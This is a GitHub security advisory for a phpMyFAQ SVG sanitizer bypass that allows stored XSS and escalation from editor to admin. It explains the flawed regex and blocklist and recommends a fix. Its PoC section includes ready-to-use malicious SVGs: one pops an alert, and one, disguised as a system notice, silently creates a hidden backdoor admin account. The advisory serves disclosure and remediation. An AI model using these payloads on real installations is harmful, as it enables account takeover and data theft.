# [M] phpMyFAQ: SVG Sanitizer Bypass via HTML Entity Encoding Leads to Stored XSS and Privilege Escalation

## Summary
Severity: Medium
Advisory: GHSA-5crx-pfhq-4hgg
CVE: CVE-2026-34974
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-5crx-pfhq-4hgg
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.1

## Details
### Summary
The regex-based SVG sanitizer in phpMyFAQ (`SvgSanitizer.php`) can be bypassed using HTML entity encoding in `javascript:` URLs within SVG `<a href>` attributes. Any user with `edit_faq` permission can upload a malicious SVG that executes arbitrary JavaScript when viewed, enabling privilege escalation from editor to full admin takeover.

### Details
The file `phpmyfaq/src/phpMyFAQ/Helper/SvgSanitizer.php` (introduced 2026-01-15) uses regex patterns to detect dangerous content in uploaded SVG files. The regex for `javascript:` URL detection is:

`/href\s*=\s*["\']javascript:[^"\']*["\']/i`

This pattern matches the literal string `javascript:` but fails when the URL is HTML entity encoded. For example, `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;` decodes to `javascript:` in the browser, but does NOT match the regex. The `isSafe()` method returns `true`, so the SVG is accepted without sanitization.

Additionally, the `DANGEROUS_ELEMENTS` blocklist misses `<animate>`, `<set>`, and `<use>` elements which can also be used to execute JavaScript in SVG context.

Uploaded SVG files are served with `Content-Type: image/svg+xml` and no `Content-Disposition: attachment` header, so browsers render them inline and execute any JavaScript they contain.

The image upload endpoint (`/admin/api/content/images`) only requires the `edit_faq` permission — not full admin — so any editor-level user can upload malicious SVGs.

### PoC
### Basic XSS (confirmed working in Chrome 146 and Edge)

1. Login to phpMyFAQ admin panel with any account that has `edit_faq` permission
2. Navigate to Admin → Content → Add New FAQ
3. In the TinyMCE editor, click the image upload button
4. Upload this SVG file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain)">
    <text x="20" y="50" font-size="16" fill="red">Click for XSS</text>
  </a>
</svg>
```

5. The SVG is uploaded to `/content/user/images/<timestamp>_<filename>.svg`
6. Open the SVG URL directly in a browser
7. Click the red text → `alert(document.domain)` executes

### Privilege Escalation (Editor → Admin Takeover)

1. As editor, upload this SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 300">
  <rect width="500" height="300" fill="#f8f9fa"/>
  <text x="250" y="100" text-anchor="middle" font-size="22" fill="#333">📋 System Notice</text>
  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('/admin/api/user/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:'backdoor',userPassword:'H4ck3d!',realName:'System',email:'evil@attacker.com','is-visible':false}),credentials:'include'}).then(r=>r.json()).then(d=>document.title='pwned')">
    <rect x="150" y="170" width="200" height="50" rx="8" fill="#0d6efd"/>
    <text x="250" y="200" text-anchor="middle" font-size="16" fill="white">View Update →</text>
  </a>
</svg>
```

2. Send the SVG URL to an admin
3. Admin opens URL, clicks "View Update →"
4. JavaScript creates backdoor admin user `backdoor:H4ck3d!`
5. Attacker logs in as `backdoor` with full admin privileges


### Impact
This is a Stored Cross-Site Scripting (XSS) vulnerability that enables privilege escalation. Any user with `edit_faq` permission (editor role) can upload a weaponized SVG file. When an admin views the SVG, arbitrary JavaScript executes in their browser on the phpMyFAQ origin, allowing the attacker to:
- Create backdoor admin accounts via the admin API
- Exfiltrate phpMyFAQ configuration (database credentials, API tokens)
- Modify or delete FAQ content
- Achieve full admin account takeover
The vulnerability affects all phpMyFAQ installations using the `SvgSanitizer` class (introduced 2026-01-15). Recommended fix: replace regex-based sanitization with a DOM-based allowlist approach, or serve SVG files with `Content-Disposition: attachment` to prevent inline rendering.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-5crx-pfhq-4hgg
- https://nvd.nist.gov/vuln/detail/CVE-2026-34974
- https://github.com/thorsten/phpMyFAQ
- https://github.com/thorsten/phpMyFAQ/releases/tag/4.1.1
